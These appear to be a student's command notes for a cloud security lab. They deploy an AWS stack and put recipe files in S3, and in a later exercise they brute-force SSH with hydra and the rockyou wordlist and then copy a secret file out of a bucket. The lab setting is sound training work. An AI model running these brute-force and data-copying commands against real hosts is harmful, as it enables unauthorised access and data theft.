# Exercise 1
## Task 3

`aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=khoadd6-udacity-keypair --capabilities CAPABILITY_IAM`

`aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-258766122316 --region us-east-1`

`aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-258766122316 --region us-east-1`

`http://c1-web-service-alb-139428374.us-east-1.elb.amazonaws.com/free_recipe`

# Exercise 3
## Task 1
`ssh -i khoadd6-udacity-keypair.pem ubuntu@35.168.17.189`

`hydra -l ubuntu -P rockyou.txt ssh://44.217.120.48`

## Task 2
`aws s3 ls  s3://cand-c3-secret-recipes-258766122316 --region us-east-1`

`aws s3 cp s3://cand-c3-secret-recipes-258766122316/secret_recipe.txt  .  --region us-east-1`

`cat secret_recipe.txt`
